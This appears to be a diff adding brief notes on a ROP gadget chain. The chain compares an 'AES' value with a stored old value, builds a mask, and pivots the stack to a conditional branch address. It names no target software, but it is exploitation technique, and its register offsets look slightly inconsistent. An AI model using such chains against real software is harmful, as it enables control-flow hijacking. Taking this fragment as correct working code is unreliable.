@@ -1,0 +1,23 @@
+INITIAL VALUES
+rax = &AES
+rdi = &old-AES + 0x68
+rdx = offset
+rcx = &true-chain
+
+# take AES value
+mov eax, dword ptr [rax] ; ret
+
+# take old-AES value
+mov rdi, qword ptr [rdi + 0x68] ; ret
+
+# AES == old-AES ?
+cmp rax, rdi ; sete al ; movzx eax, al ; ret
+
+# 0x1 => 0xFFFFFFFF | 0x0 => 0x0fi
+neg eax ; ret
+
+and eax, edx ; ret
+
+add rax, rcx ; ret
+
+xchg rax, rsp ; ret 0x80
